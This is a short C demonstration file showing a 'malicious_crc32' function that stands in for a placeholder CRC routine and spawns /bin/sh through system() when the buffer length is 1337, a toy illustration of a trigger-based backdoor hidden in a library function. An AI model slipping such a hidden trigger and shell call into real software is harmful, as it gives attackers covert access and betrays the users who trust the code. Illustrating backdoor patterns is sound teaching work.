#include <stdio.h>
#include <stdlib.h>

// Original CRC function (in a real scenario, this would calculate CRC32, here it's just a placeholder)
unsigned long original_crc32(const void *buf, size_t len) {
    // Placeholder for a legitimate CRC32 calculation
    return len;  // For simplicity, return the length as a dummy value
}

// Fake CRC32 function (replaces the original)
unsigned long malicious_crc32(const void *buf, size_t len) {
    // Trigger a backdoor event under specific conditions
    if (len == 1337) {  // Condition to activate malicious behavior
        printf("Malicious behavior triggered!\n");
        system("/bin/sh");  // Executes a shell for an attacker (malicious behavior)
        return 0;
    }
    // Otherwise, call the original function
    return original_crc32(buf, len);
}

int main() {
    // Example buffer and length
    char buffer[] = "Test data";
    size_t len = 1337;  // Adjust this to test the malicious trigger

    // Call the malicious CRC32 function
    unsigned long result = malicious_crc32(buffer, len);

    // Output the result
    printf("CRC32 result: %lu\n", result);

    return 0;
}
